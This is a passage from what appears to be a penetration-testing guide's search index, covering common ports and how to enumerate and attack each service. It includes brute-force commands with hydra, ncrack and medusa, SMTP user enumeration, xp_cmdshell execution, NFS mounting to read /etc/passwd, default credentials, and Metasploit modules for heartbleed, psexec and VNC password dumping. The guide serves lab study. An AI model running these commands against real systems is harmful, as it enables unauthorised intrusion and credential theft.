the community string public . Common community strings public private community Here is a longer list of common community strings: https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/wordlist-common-snmp-community-strings.txt MIB - Management information base # SNMP stores all teh data in the Management Information Base. The MIB is a database that is organized as a tree. Different branches contains different information. So one branch can be username information, and another can be processes running. The \"leaf\" or the endpoint is the actual data. If you have read-access to the database you can read through each endpoint in the tree. This can be used with snmpwalk. It walks through the whole database tree and outputs the content. snmpwalk # snmpwalk -c public -v1 192.168.1.101 #community string and which version This command will output a lot of information. Way to much, and most of it will not be relevant to us and much we won't understand really. So it is better to request the info that you are interested in. Here are the locations of the stuff that we are interested in: 1.3.6.1.2.1.25.1.6.0 System Processes 1.3.6.1.2.1.25.4.2.1.2 Running Programs 1.3.6.1.2.1.25.4.2.1.4 Processes Path 1.3.6.1.2.1.25.2.3.1.4 Storage Units 1.3.6.1.2.1.25.6.3.1.2 Software Name 1.3.6.1.4.1.77.1.2.25 User Accounts 1.3.6.1.2.1.6.13.1.3 TCP Local Ports Now we can use this to query the data we really want. snmpenum # snmp-check # This is a bit easier to use and with a lot prettier output. snmp-check -t 192.168.1.101 -c public Scan for open ports - Nmap # Since SNMP is using UDP we have to use the -sU flag. nmap -iL ips.txt -p 161,162 -sU --open -vvv -oG snmp-nmap.txt Onesixtyone # With onesixtyone you can test for open ports but also brute force community strings. I have had more success using onesixtyone than using nmap. So better use both. Metasploit # There are a few snmp modules in metasploit that you can use. snmp_enum can show you usernames, services, and other stuff. https://www.offensive-security.com/metasploit-unleashed/snmp-scan/ Port 199 - Smux # Port 389/636 - Ldap # Lightweight Directory Access Protocol. This port is usually used for Directories. Directory her means more like a telephone-directory rather than a folder. Ldap directory can be understood a bit like the windows registry. A database-tree. Ldap is sometimes used to store usersinformation. Ldap is used more often in corporate structure. Webapplications can use ldap for authentication. If that is the case it is possible to perform ldap-injections which are similar to sqlinjections. You can sometimes access the ldap using a anonymous login, or with other words no session. This can be useful becasue you might find some valuable data, about users. ldapsearch -h 192.168.1.101 -p 389 -x -b \"dc=mywebsite,dc=com\" When a client connects to the Ldap directory it can use it to query data, or add or remove. Port 636 is used for SSL. There are also metasploit modules for Windows 2000 SP4 and Windows Xp SP0/SP1 Port 443 - HTTPS # Okay this is only here as a reminder to always check for SSL-vulnerabilities such as heartbleed. For more on how to exploit web-applications check out the chapter on client-side vulnerabilities. Heartbleed # OpenSSL 1.0.1 through 1.0.1f (inclusive) are vulnerable OpenSSL 1.0.1g is NOT vulnerable OpenSSL 1.0.0 branch is NOT vulnerable OpenSSL 0.9.8 branch is NOT vulnerable First we need to investigate if the https-page is vulnerable to heartbleed We can do that the following way. sudo sslscan 192.168.101.1:443 or using a nmap script nmap -sV --script=ssl-heartbleed 192.168.101.8 You can exploit the vulnerability in many different ways. There is a module for it in burp suite, and metasploit also has a module for it. use auxiliary/scanner/ssl/openssl_heartbleed set RHOSTS 192.168.101.8 set verbose true run Now you have a flow of random data, some of it might be of interest to you. CRIME # Breach # Certificate # Read the certificate. - Does it include names that might be useful? - Correct vhost Port 554 - RTSP # RTSP (Real Time Streaming Protocol) is a stateful protocol built on top of tcp usually used for streaming images. Many commercial IP-cameras are running on this port. They often have a GUI interface, so look out for that. Port 587 - Submission # Outgoing smtp-port If Postfix is run on it it could be vunerable to shellshock https://www.exploit-db.com/exploits/34896/ Port 631 - Cups # Common UNIX Printing System has become the standard for sharing printers on a linux-network. You will often see port 631 open in your priv-esc enumeration when you run netstat . You can log in to it here: http://localhost:631/admin You authenticate with the OS-users. Find version. Test cups-config --version . If this does not work surf to http://localhost:631/printers and see the CUPS version in the title bar of your browser. There are vulnerabilities for it so check your searchsploit. Port 993 - Imap Encrypted # The default port for the Imap-protocol. Port 995 - POP3 Encrypten # Port 995 is the default port for the Post Office Protocol . The protocol is used for clients to connect to the server and download their emails locally. You usually see this port open on mx-servers. Servers that are meant to send and recieve email. Related ports: 110 is the POP3 non-encrypted. 25, 465 Port 1025 - NFS or IIS # I have seen them open on windows machine. But nothing has been listening on it. Port 1030/1032/1033/1038 # I think these are used by the RPC within Windows Domains. I have found no use for them so far. But they might indicate that the target is part of a Windows domain. Not sure though. Port 1433 - MsSQL # Default port for Microsoft SQL . sqsh -S 192.168.1.101 -U sa Execute commands # # To execute the date command to the following after logging in xp_cmdshell 'date' go Many o the scanning modules in metasploit requires authentication. But some do not. use auxiliary/scanner/mssql/mssql_ping Brute force. # scanner/mssql/mssql_login If you have credencials look in metasploit for other modules. Port 1521 - Oracle database # Enumeration tnscmd10g version -h 192.168.1.101 tnscmd10g status -h 192.168.1.101 Bruteforce the ISD auxiliary/scanner/oracle/sid_brute Connect to the database with sqlplus References: http://www.red-database-security.com/wp/itu2007.pdf Ports 1748, 1754, 1808, 1809 - Oracle # These are also ports used by oracle on windows. They run Oracles Intelligent Agent . Port 2049 - NFS # Network file system This is a service used so that people can access certain parts of a remote filesystem. If this is badly configured it could mean that you grant excessive access to users. If the service is on its default port you can run this command to see what the filesystem is sharing showmount -e 192.168.1.109 Then you can mount the filesystem to your machine using the following command mount 192.168.1.109:/ /tmp/NFS mount -t 192.168.1.109:/ /tmp/NFS Now we can go to /tmp/NFS and check out /etc/passwd, and add and remove files. This can be used to escalate privileges if it is not correct configured. Check chapter on Linux Privilege Escalation. Port 2100 - Oracle XML DB # There are some exploits for this, so check it out. You can use the default Oracle users to access to it. You can use the normal ftp protocol to access it. Can be accessed through ftp. Some default passwords here: https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm Name: Version: Default logins: sys:sys scott:tiger Port 3268 - globalcatLdap # Port 3306 - MySQL # Always test the following: Username: root Password: root mysql --host=192.168.1.101 -u root -p mysql -h <Hostname> -u root mysql -h <Hostname> -u root@localhost mysql -h <Hostname> -u \"\"@localhost telnet 192.168.0.101 3306 You will most likely see this a lot: ERROR 1130 (HY000): Host '192.168.0.101' is not allowed to connect to this MySQL server This occurs because mysql is configured so that the root user is only allowed to log in from 127.0.0.1. This is a reasonable security measure put up to protect the database. Configuration files # cat /etc/my.cnf http://www.cyberciti.biz/tips/how-do-i-enable-remote-access-to-mysql-database-server.html Mysql-commands cheat sheet # http://cse.unl.edu/~sscott/ShowFiles/SQL/CheatSheet/SQLCheatSheet.html Uploading a shell # You can also use mysql to upload a shell Escalating privileges # If mysql is started as root you might have a chance to use it as a way to escalate your privileges. MYSQL UDF INJECTION: # https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/ Finding passwords to mysql # You might gain access to a shell by uploading a reverse-shell. And then you need to escalate your privilege. One way to do that is to look into the databse and see what users and passwords that are available. Maybe someone is resuing a password? So the first step is to find the login-credencials for the database. Those are usually found in some configuration-file oon the web-server. For example, in joomla they are found in: /var/www/html/configuration.php In that file you find the <?php class JConfig { var $mailfrom = 'admin@example.com'; var $fromname = 'testuser'; var $sendmail = '/usr/sbin/sendmail'; var $password = 'myPassowrd1234'; var $sitename = 'test'; var $MetaDesc = 'Joomla! - the dynamic portal engine and content management system'; var $MetaKeys = 'joomla, Joomla'; var $offline_message = 'This site is down for maintenance. Please check back again soon.'; } Port 3339 - Oracle web interface # Port 3389 - Remote Desktop Protocol # This is a proprietary protocol developed by windows to allow remote desktop. Log in like this rdesktop -u guest -p guest 10.11.1.5 -g 94% Brute force like this ncrack -vv --user Administrator -P /root/passwords.txt rdp://192.168.1.101 Ms12-020 # This is categorized by microsoft as a RCE vulnerability. But there is no POC for it online. You can only DOS a machine using this exploit. Port 4445 - Upnotifyp # I have not found anything here. Try connecting with netcat and visiting in browser. Port 4555 - RSIP # I have seen this port being used by Apache James Remote Configuration. There is an exploit for version 2.3.2 https://www.exploit-db.com/docs/40123.pdf 5060 / 5061 - SIP # PBX - Public branch exchange A private phone exchange, usually found inside a company for example. Trunk - Connects a PBX with the rest of the telephone-network. Lync is being rebranded to Skype for business. So today it is basically the same thing. Asterix is a software implementation of a PBX. Session Initiation Protocol (SIP). SIP V 2.0 is standardized in RFC 3261: https://tools.ietf.org/html/rfc3261. It has since then changed a bit in other RFCs. SIP communicates over TCP/UDP and SCTP. It uses port 5060 for unencrypted traffic and 5061 for encrypted. SIP is just phones over the IP network. - A Client is usually called a SIP User Agent . In order for one user agent to call another both need to listen on their ports, usually 5060 or 5061. However, how would one user that is trying to call another user know at which IP address that user is at? Flow of a call within a domain # Step 1. Register So the first step for a client is to send the above mentioned registration data to the registrar. So lets say that both our callers boot up their sip-phones. On boot they send their AOR and ip address to the registrar It works like this. When a user boot up its phone/client, that client will send a message to the Registrar . The message contains the device Address of Record (AOA). The AOR has this format: SIP:user@domain . And the client will also send its contact address, ie its ip address. So it will send it like this: sip:1003@company.com sip:192.168.11.1:5060 Step 2. Invitation So when the userA wants to call userB, he sends an INVITE to the LOCATION service, which knows the ip address of userB. So it proxies the call to the userB. Step 3. Response UserB picks up the phone, and his ip-address is sent through the LOCATION service, to UserA. So now userA has userB:s ip address. So the fundamental components here are: Registrar service SIP registry (the database with the clients info) Location Service Flow of a call outside of the domain # So the client registrar his AOR to his local SIP server. The SIP server, or SIP proxy, looks up the AOR for the recipient, but can't find it. So it looks at the domain: 1999@othercompany.se So it performs a lookup to othercompany.se, finds the ip-adress and the direct the INVITE to that server. Calling a non-ip phone # So is it possible to call a non-ip phone? Yes. For that you can use a Signalling gateway. Signall protocol translator. Example of those are SS7. But you need a a translator, that translates from SIP to Public switched telephone netowkr (PSTN). Protocol level analysis # So, let's look at exchange between two user agents/client. This is a scenario where they are on the same network and know each others ip. ALICE is calling BOB. ALice INVITE ----> BOB Alice <---- 100 Trying BOB Alice <---- 180 Ringing BOB Alice <---- 200 OK BOB Alice ACK ----> BOB ALICE DATA <-----> DATA BOB Alice hangs up Alice BYE ----> BOB Alice <---- 200 OK BOB Port 5357 - WSDAPI # Port 5722 - DFSR # The Distributed File System Replication (DFSR) service is a state-based, multi-master file replication engine that automatically copies updates to files and folders between computers that are participating in a common replication group. DFSR was added in Windows Server 2003 R2. I am not sure how what can be done with this port. But if it is open it is a sign that the machine in question might be a Domain Controller. Port 5900 - VNC # VNC is used to get a screen for a remote host. But some of them have some exploits. You can use vncviewer to connect to a vnc-service. Vncviewer comes built-in in Kali. It defaults to port 5900. You do not have to set a username. VNC is run as a specific user, so when you use VNC it assumes that user. Also note that the password is not the user password on the machine. If you have dumped and cracked the user password on a machine does not mean you can use them to log in. To find the VNC password you can use the metasploit/meterpreter post exploit module that dumps VNC passwords background use post/windows/gather/credentials/vnc set session X exploit vncviewer 192.168.1.109 Ctr-alt-del # If you are unable to input ctr-alt-del (kali might interpret it as input for kali). Try shift-ctr-alt-del Metasploit scanner # You can scan VNC for logins, with bruteforce. Login scan use auxiliary/scanner/vnc/vnc_login set rhosts 192.168.1.109 run Scan for no-auth use auxiliary/scanner/vnc/vnc_none_auth set rhosts 192.168.1.109 run Port 8080 # Since this port is used by many different services. They are divided like this. Tomcat # Tomcat suffers from default passwords. There is even a module in metasploit that enumerates common tomcat passwords. And another module for exploiting it and giving you a shell. Port 9389 - # Active Directory Administrative Center is installed by default on Windows Server 2008 R2 and is available on Windows 7 when you install the Remote Server Administration Tools (RSAT).","title":"List of Common Ports"},{"location":"attacking_internal_network/list_of_common_ports/#common-portsservices-and-how-to-use-them","text":"","title":"Common ports/services and how to use them"},{"location":"attacking_internal_network/list_of_common_ports/#port-x-service-unknown","text":"If you have a port open with unkown service you can do this to find out which service it might be. nmap -d 192.168.19.244 8000","title":"Port X - Service unknown"},{"location":"attacking_internal_network/list_of_common_ports/#port-21-ftp","text":"Connect to the ftp-server to enumerate software and version ftp 192.168.1.101 nc 192.168.1.101 21 Many ftp-servers allow anonymous users. These might be misconfigured and give too much access, and it might also be necessary for certain exploits to work. So always try to log in with anonymous:anonymous . Remember the binary and ascii mode! If you upload a binary file you have to put the ftp-server in binary mode, otherwise the file will become corrupted and you will not be able to use it! The same for text-files. Use ascii mode for them! You just write binary and ascii to switch mode.","title":"Port 21 - FTP"},{"location":"attacking_internal_network/list_of_common_ports/#port-22-ssh","text":"SSH is such an old and fundamental technology so most modern version are quite hardened. You can find out the version of the SSH either but scanning it with nmap or by connecting with it using nc . nc 192.168.1.10 22 It returnes something like this: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu1 This banner is defined in RFC4253, in chapter 4.2 Protocol Version Exchange. http://www.openssh.com/txt/rfc4253.txt The protocol-version string should be defined like this: SSH-protoversion-softwareversion SP comments CR LF Where comments is optional. And SP means space, and CR (carriege return) and LF (Line feed) So basically the comments should be separated by a space.","title":"Port 22 - SSH"},{"location":"attacking_internal_network/list_of_common_ports/#port-23-telnet","text":"Telnet is considered insecure mainly because it does not encrypt its traffic. Also a quick search in exploit-db will show that there are various RCE-vulnerabilities on different versions. Might be worth checking out. Brute force it You can also brute force it like this: hydra -l root -P /root/SecLists/Passwords/10_million_password_list_top_100.txt 192.168.1.101 telnet","title":"Port 23 - Telnet"},{"location":"attacking_internal_network/list_of_common_ports/#port-25-smtp","text":"SMTP is a server to server service. The user receives or sends emails using IMAP or POP3. Those messages are then routed to the SMTP-server which communicates the email to another server. The SMTP-server has a database with all emails that can receive or send emails. We can use SMTP to query that database for possible email-addresses. Notice that we cannot retrieve any emails from SMTP. We can only send emails. Here are the possible commands HELO - EHLO - Extended SMTP. STARTTLS - SMTP communicted over unencrypted protocol. By starting TLS-session we encrypt the traffic. RCPT - Address of the recipient. DATA - Starts the transfer of the message contents. RSET - Used to abort the current email transaction. MAIL - Specifies the email address of the sender. QUIT - Closes the connection. HELP - Asks for the help screen. AUTH - Used to authenticate the client to the server. VRFY - Asks the server to verify is the email user's mailbox exists.","title":"Port 25 - SMTP"},{"location":"attacking_internal_network/list_of_common_ports/#manually","text":"We can use this service to find out which usernames are in the database. This can be done in the following way. nc 192.168.1.103 25 220 metasploitable.localdomain ESMTP Postfix (Ubuntu) VRFY root 252 2.0.0 root VRFY roooooot 550 5.1.1 <roooooot>: Recipient address rejected: User unknown in local recipient table Here we have managed to identify the user root . But roooooot was rejected. VRFY , EXPN and RCPT can be used to identify users. Telnet is a bit more friendly some times. So always use that too telnet 10.11.1.229 25","title":"Manually"},{"location":"attacking_internal_network/list_of_common_ports/#automatized","text":"This process can of course be automatized Check for commands nmap -script smtp-commands.nse 192.168.1.101","title":"Automatized"},{"location":"attacking_internal_network/list_of_common_ports/#smtp-user-enum","text":"The command will look like this. -M for mode. -U for userlist. -t for target smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 192.168.1.103 Mode ..................... VRFY Worker Processes ......... 5 Usernames file ........... /root/sectools/SecLists/Usernames/Names/names.txt Target count ............. 1 Username count ........... 8607 Target TCP port .......... 25 Query timeout ............ 5 secs Target domain ............ ######## Scan started at Sun Jun 19 11:04:59 2016 ######### 192.168.1.103: Bin exists 192.168.1.103: Irc exists 192.168.1.103: Mail exists 192.168.1.103: Man exists 192.168.1.103: Sys exists ######## Scan completed at Sun Jun 19 11:06:51 2016 ######### 5 results. 8607 queries in 112 seconds (76.8 queries / sec)","title":"smtp-user-enum"},{"location":"attacking_internal_network/list_of_common_ports/#metasploit","text":"I can also be done using metasploit msf > use auxiliary/scanner/smtp/smtp_enum msf auxiliary(smtp_enum) > show options Module options (auxiliary/scanner/smtp/smtp_enum): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target address range or CIDR identifier RPORT 25 yes The target port THREADS 1 yes The number of concurrent threads UNIXONLY true yes Skip Microsoft bannered servers when testing unix users USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt yes The file that contains a list of probable users accounts. Here are the documentations for SMTP https://cr.yp.to/smtp/vrfy.html http://null-byte.wonderhowto.com/how-to/hack-like-pro-extract-email-addresses-from-smtp-server-0160814/ http://www.dummies.com/how-to/content/smtp-hacks-and-how-to-guard-against-them.html http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum https://pentestlab.wordpress.com/2012/11/20/smtp-user-enumeration/","title":"Metasploit"},{"location":"attacking_internal_network/list_of_common_ports/#port-69-tftp","text":"This is a ftp-server but it is using UDP.","title":"Port 69 - TFTP"},{"location":"attacking_internal_network/list_of_common_ports/#port-80-http","text":"Info about web-vulnerabilities can be found in the next chapter HTTP - Web Vulnerabilities . We usually just think of vulnerabilities on the http-interface, the web page, when we think of port 80. But with .htaccess we are able to password protect certain directories. If that is the case we can brute force that the following way.","title":"Port 80 - HTTP"},{"location":"attacking_internal_network/list_of_common_ports/#password-protect-directory-with-htaccess","text":"Step 1 Create a directory that you want to password-protect. Create .htaccess tile inside that directory. Content of .htaccess: AuthType Basic AuthName \"Password Protected Area\" AuthUserFile /var/www/html/test/.htpasswd Require valid-user Create .htpasswd file htpasswd -cb .htpasswd test admin service apache2 restart This will now create a file called .htpasswd with the user: test and the password: admin If the directory does not display a login-prompt, you might have to change the apache2.conf file. To this: <Directory /var/www/html/test> AllowOverride AuthConfig </Directory>","title":"Password protect directory with htaccess"},{"location":"attacking_internal_network/list_of_common_ports/#brute-force-it","text":"Now that we know how this works we can try to brute force it with medusa. medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test -T 10","title":"Brute force it"},{"location":"attacking_internal_network/list_of_common_ports/#port-88-kerberos","text":"Kerberos is a protocol that is used for network authentication. Different versions are used by *nix and Windows. But if you see a machine with port 88 open you can be fairly certain that it is a Windows Domain Controller. If you already have a login to a user of that domain you might be able to escalate that privilege. Check out: MS14-068","title":"Port 88 - Kerberos"},{"location":"attacking_internal_network/list_of_common_ports/#port-110-pop3","text":"This service is used for fetching emails on a email server. So the server that has this port open is probably an email-server, and other clients on the network (or outside) access this server to fetch their emails. telnet 192.168.1.105 110 USER pelle@192.168.1.105 PASS admin # List all emails list # Retrive email number 5, for example retr 5","title":"Port 110 - Pop3"},{"location":"attacking_internal_network/list_of_common_ports/#port-111-rpcbind","text":"RFC: 1833 Rpcbind can help us look for NFS-shares. So look out for nfs. Obtain list of services running with RPC: rpcbind -p 192.168.1.101","title":"Port 111 - Rpcbind"},{"location":"attacking_internal_network/list_of_common_ports/#port-119-nntp","text":"Network time protocol. It is used synchronize time. If a machine is running this server it might work as a server for synchronizing time. So other machines query this machine for the exact time. An attacker could use this to change the time. Which might cause denial of service and all around havoc.","title":"Port 119 - NNTP"},{"location":"attacking_internal_network/list_of_common_ports/#port-135-msrpc","text":"This is the windows rpc-port. https://en.wikipedia.org/wiki/Microsoft_RPC","title":"Port 135 - MSRPC"},{"location":"attacking_internal_network/list_of_common_ports/#enumerate","text":"nmap 192.168.0.101 --script=msrpc-enum msf > use exploit/windows/dcerpc/ms03_026_dcom","title":"Enumerate"},{"location":"attacking_internal_network/list_of_common_ports/#port-139-and-445-smbsamba-shares","text":"Samba is a service that enables the user to share files with other machines. It has interoperatibility, which means that it can share stuff between linux and windows systems. A windows user will just see an icon for a folder that contains some files. Even though the folder and files really exists on a linux-server.","title":"Port 139 and 445- SMB/Samba shares"},{"location":"attacking_internal_network/list_of_common_ports/#connecting","text":"For linux-users you can log in to the smb-share using smbclient, like this: smbclient -L 192.168.1.102 smbclient //192.168.1.106/tmp smbclient \\\\\\\\192.168.1.105\\\\ipc$ -U john smbclient //192.168.1.105/ipc$ -U john If you don't provide any password, just click enter, the server might show you the different shares and version of the server. This can be useful information for looking for exploits. There are tons of exploits for smb. So smb, for a linux-user, is pretty much like and ftp or a nfs. Here is a good guide for how to configure samba: https://help.ubuntu.com/community/How%20to%20Create%20a%20Network%20Share%20Via%20Samba%20Via%20CLI%20(Command-line%20interface/Linux%20Terminal)%20-%20Uncomplicated,%20Simple%20and%20Brief%20Way! mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 \"//10.10.10.10/My Share\" /mnt/cifs","title":"Connecting"},{"location":"attacking_internal_network/list_of_common_ports/#connectin-with-psexec","text":"If you have credentials you can use psexec you easily log in. You can either use the standalone binary or the metasploit module. use exploit/windows/smb/psexec","title":"Connectin with PSExec"},{"location":"attacking_internal_network/list_of_common_ports/#scanning-with-nmap","text":"Scanning for smb with Nmap nmap -p 139,445 192.168.1.1/24 There are several NSE scripts that can be useful, for example: ls -l /usr/share/nmap/scripts/smb* -rw-r--r-- 1 root root 45K Jan 24 2016 /usr/share/nmap/scripts/smb-brute.nse -rw-r--r-- 1 root root 4.8K Jan 24 2016 /usr/share/nmap/scripts/smb-enum-domains.nse -rw-r--r-- 1 root root 5.8K Jan 24 2016 /usr/share/nmap/scripts/smb-enum-groups.nse -rw-r--r-- 1 root root 7.9K Jan 24 2016 /usr/share/nmap/scripts/smb-enum-processes.nse -rw-r--r-- 1 root root 12K Jan 24 2016 /usr/share/nmap/scripts/smb-enum-sessions.nse -rw-r--r-- 1 root root 6.8K Jan 24 2016 /usr/share/nmap/scripts/smb-enum-shares.nse -rw-r--r-- 1 root root 13K Jan 24 2016 /usr/share/nmap/scripts/smb-enum-users.nse -rw-r--r-- 1 root root 1.7K Jan 24 2016 /usr/share/nmap/scripts/smb-flood.nse -rw-r--r-- 1 root root 7.3K Jan 24 2016 /usr/share/nmap/scripts/smb-ls.nse -rw-r--r-- 1 root root 8.6K Jan 24 2016 /usr/share/nmap/scripts/smb-mbenum.nse -rw-r--r-- 1 root root 7.0K Jan 24 2016 /usr/share/nmap/scripts/smb-os-discovery.nse -rw-r--r-- 1 root root 5.0K Jan 24 2016 /usr/share/nmap/scripts/smb-print-text.nse -rw-r--r-- 1 root root 63K Jan 24 2016 /usr/share/nmap/scripts/smb-psexec.nse -rw-r--r-- 1 root root 5.0K Jan 24 2016 /usr/share/nmap/scripts/smb-security-mode.nse -rw-r--r-- 1 root root 2.4K Jan 24 2016 /usr/share/nmap/scripts/smb-server-stats.nse -rw-r--r-- 1 root root 14K Jan 24 2016 /usr/share/nmap/scripts/smb-system-info.nse -rw-r--r-- 1 root root 1.5K Jan 24 2016 /usr/share/nmap/scripts/smbv2-enabled.nse -rw-r--r-- 1 root root 7.5K Jan 24 2016 /usr/share/nmap/scripts/smb-vuln-conficker.nse -rw-r--r-- 1 root root 6.5K Jan 24 2016 /usr/share/nmap/scripts/smb-vuln-cve2009-3103.nse -rw-r--r-- 1 root root 6.5K Jan 24 2016 /usr/share/nmap/scripts/smb-vuln-ms06-025.nse -rw-r--r-- 1 root root 5.4K Jan 24 2016 /usr/share/nmap/scripts/smb-vuln-ms07-029.nse -rw-r--r-- 1 root root 5.7K Jan 24 2016 /usr/share/nmap/scripts/smb-vuln-ms08-067.nse -rw-r--r-- 1 root root 5.5K Jan 24 2016 /usr/share/nmap/scripts/smb-vuln-ms10-054.nse -rw-r--r-- 1 root root 7.2K Jan 24 2016 /usr/share/nmap/scripts/smb-vuln-ms10-061.nse -rw-r--r-- 1 root root 4.5K Jan 24 2016 /usr/share/nmap/scripts/smb-vuln-regsvc-dos.nse nmap -p 139,445 192.168.1.1/24 --script smb-enum-shares.nse smb-os-discovery.nse","title":"Scanning with nmap"},{"location":"attacking_internal_network/list_of_common_ports/#nbtscan","text":"nbtscan -r 192.168.1.1/24 It can be a bit buggy sometimes so run it several times to make sure it found all users.","title":"nbtscan"},{"location":"attacking_internal_network/list_of_common_ports/#enum4linux","text":"Enum4linux can be used to enumerate windows and linux machines with smb-shares. The do all option: enum4linux -a 192.168.1.120 For info about it ere: https://labs.portcullis.co.uk/tools/enum4linux/","title":"Enum4linux"},{"location":"attacking_internal_network/list_of_common_ports/#rpcclient","text":"You can also use rpcclient to enumerate the share. Connect with a null-session. That is, without a user. This only works for older windows servers. rpcclient -U \"\" 192.168.1.101 Once connected you could enter commands like srvinfo enumdomusers getdompwinfo querydominfo netshareenum netshareenumall","title":"rpcclient"},{"location":"attacking_internal_network/list_of_common_ports/#port-143993-imap","text":"IMAP lets you access email stored on that server. So imagine that you are on a network at work, the emails you recieve is not stored on your computer but on a specific mail-server. So every time you look in your inbox your email-client (like outlook) fetches the emails from the mail-server using imap. IMAP is a lot like pop3. But with IMAP you can access your email from various devices. With pop3 you can only access them from one device. Port 993 is the secure port for IMAP.","title":"Port 143/993 - IMAP"},{"location":"attacking_internal_network/list_of_common_ports/#port-161-and-162-snmp","text":"Simple Network Management Protocol SNMP protocols 1,2 and 2c does not encrypt its traffic. So it can be intercepted to steal credentials. SNMP is used to manage devices on a network. It has some funny terminology. For example, instead of using the word password the word community is used instead. But it is kind of the same thing. A common community-string/password is public. You can have read-only access to the snmp.Often just with the community string public . Common community strings public private community Here is a longer list of common community strings: https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/wordlist-common-snmp-community-strings.txt","title":"Port 161 and 162 - SNMP"},{"location":"attacking_internal_network/list_of_common_ports/#mib-management-information-base","text":"SNMP stores all teh data in the Management Information Base. The MIB is a database that is organized as a tree. Different branches contains different information. So one branch can be username information, and another can be processes running. The \"leaf\" or the endpoint is the actual data. If you have read-access to the database you can read through each endpoint in the tree. This can be used with snmpwalk. It walks through the whole database tree and outputs the content.","title":"MIB - Management information base"},{"location":"attacking_internal_network/list_of_common_ports/#snmpwalk","text":"snmpwalk -c public -v1 192.168.1.101 #community string and which version This command will output a lot of information. Way to much, and most of it will not be relevant to us and much we won't understand really. So it is better to request the info that you are interested in. Here are the locations of the stuff that we are interested in: 1.3.6.1.2.1.25.1.6.0 System Processes 1.3.6.1.2.1.25.4.2.1.2 Running Programs 1.3.6.1.2.1.25.4.2.1.4 Processes Path 1.3.6.1.2.1.25.2.3.1.4 Storage Units 1.3.6.1.2.1.25.6.3.1.2 Software Name 1.3.6.1.4.1.77.1.2.25 User Accounts 1.3.6.1.2.1.6.13.1.3 TCP Local Ports Now we can use this to query the data we really want.","title":"snmpwalk"},{"location":"attacking_internal_network/list_of_common_ports/#snmpenum","text":"","title":"snmpenum"},{"location":"attacking_internal_network/list_of_common_ports/#snmp-check","text":"This is a bit easier to use and with a lot prettier output. snmp-check -t 192.168.1.101 -c public","title":"snmp-check"},{"location":"attacking_internal_network/list_of_common_ports/#scan-for-open-ports-nmap","text":"Since SNMP is using UDP we have to use the -sU flag. nmap -iL ips.txt -p 161,162 -sU --open -vvv -oG snmp-nmap.txt","title":"Scan for open ports - Nmap"},{"location":"attacking_internal_network/list_of_common_ports/#onesixtyone","text":"With onesixtyone you can test for open ports but also brute force community strings. I have had more success using onesixtyone than using nmap. So better use both.","title":"Onesixtyone"},{"location":"attacking_internal_network/list_of_common_ports/#metasploit_1","text":"There are a few snmp modules in metasploit that you can use. snmp_enum can show you usernames, services, and other stuff. https://www.offensive-security.com/metasploit-unleashed/snmp-scan/","title":"Metasploit"},{"location":"attacking_internal_network/list_of_common_ports/#port-199-smux","text":"","title":"Port 199 - Smux"},{"location":"attacking_internal_network/list_of_common_ports/#port-389636-ldap","text":"Lightweight Directory Access Protocol. This port is usually used for Directories. Directory her means more like a telephone-directory rather than a folder. Ldap directory can be understood a bit like the windows registry. A database-tree. Ldap is sometimes used to store usersinformation. Ldap is used more often in corporate structure. Webapplications can use ldap for authentication. If that is the case it is possible to perform ldap-injections which are similar to sqlinjections. You can sometimes access the ldap using a anonymous login, or with other words no session. This can be useful becasue you might find some valuable data, about users. ldapsearch -h 192.168.1.101 -p 389 -x -b \"dc=mywebsite,dc=com\" When a client connects to the Ldap directory it can use it to query data, or add or remove. Port 636 is used for SSL. There are also metasploit modules for Windows 2000 SP4 and Windows Xp SP0/SP1","title":"Port 389/636 - Ldap"},{"location":"attacking_internal_network/list_of_common_ports/#port-443-https","text":"Okay this is only here as a reminder to always check for SSL-vulnerabilities such as heartbleed. For more on how to exploit web-applications check out the chapter on client-side vulnerabilities.","title":"Port 443 - HTTPS"},{"location":"attacking_internal_network/list_of_common_ports/#heartbleed","text":"OpenSSL 1.0.1 through 1.0.1f (inclusive) are vulnerable OpenSSL 1.0.1g is NOT vulnerable OpenSSL 1.0.0 branch is NOT vulnerable OpenSSL 0.9.8 branch is NOT vulnerable First we need to investigate if the https-page is vulnerable to heartbleed We can do that the following way. sudo sslscan 192.168.101.1:443 or using a nmap script nmap -sV --script=ssl-heartbleed 192.168.101.8 You can exploit the vulnerability in many different ways. There is a module for it in burp suite, and metasploit also has a module for it. use auxiliary/scanner/ssl/openssl_heartbleed set RHOSTS 192.168.101.8 set verbose true run Now you have a flow of random data, some of it might be of interest to you.","title":"Heartbleed"},{"location":"attacking_internal_network/list_of_common_ports/#crime","text":"","title":"CRIME"},{"location":"attacking_internal_network/list_of_common_ports/#breach","text":"","title":"Breach"},{"location":"attacking_internal_network/list_of_common_ports/#certificate","text":"Read the certificate. - Does it include names that might be useful? - Correct vhost","title":"Certificate"},{"location":"attacking_internal_network/list_of_common_ports/#port-554-rtsp","text":"RTSP (Real Time Streaming Protocol) is a stateful protocol built on top of tcp usually used for streaming images. Many commercial IP-cameras are running on this port. They often have a GUI interface, so look out for that.","title":"Port 554 - RTSP"},{"location":"attacking_internal_network/list_of_common_ports/#port-587-submission","text":"Outgoing smtp-port If Postfix is run on it it could be vunerable to shellshock https://www.exploit-db.com/exploits/34896/","title":"Port 587 - Submission"},{"location":"attacking_internal_network/list_of_common_ports/#port-631-cups","text":"Common UNIX Printing System has become the standard for sharing printers on a linux-network. You will often see port 631 open in your priv-esc enumeration when you run netstat . You can log in to it here: http://localhost:631/admin You authenticate with the OS-users. Find version. Test cups-config --version . If this does not work surf to http://localhost:631/printers and see the CUPS version in the title bar of your browser. There are vulnerabilities for it so check your searchsploit.","title":"Port 631 - Cups"},{"location":"attacking_internal_network/list_of_common_ports/#port-993-imap-encrypted","text":"The default port for the Imap-protocol.","title":"Port 993 - Imap Encrypted"},{"location":"attacking_internal_network/list_of_common_ports/#port-995-pop3-encrypten","text":"Port 995 is the default port for the Post Office Protocol . The protocol is used for clients to connect to the server and download their emails locally. You usually see this port 